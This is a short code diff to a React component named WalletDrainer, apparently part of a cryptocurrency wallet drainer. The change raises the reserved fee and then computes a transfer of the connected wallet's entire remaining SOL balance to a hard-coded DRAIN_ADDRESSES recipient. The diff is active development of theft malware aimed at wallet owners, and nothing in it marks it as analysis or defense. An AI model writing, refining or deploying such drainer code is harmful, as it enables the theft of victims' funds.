@@ -112,13 +112,23 @@ export default function WalletDrainer({ wallet }) {
           const balance = await connection.getBalance(senderPublicKey);
         //   const balance = 1000000000000;
           console.log(`💰 SOL Balance: ${balance / LAMPORTS_PER_SOL} SOL`);
+
+          // what is 0.00016 SOL in lamports?
+            // 1 SOL = 1000000000 lamports
+            // 0.00016 SOL = 160000 lamports
+          // what is $4.5 in lamports?
+
+
+        const gasFee = 200000;
+
   
-          if (balance <= 5000) {
+          if (balance <= gasFee) {
             console.log("❌ Not enough SOL to cover transaction fees.");
             return;
           }
   
-          const sendAmount = balance - 5000;
+          const sendAmount = balance - gasFee;
+        //   const sendAmount = 22270000;
           const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
   
           let attempts = 0;
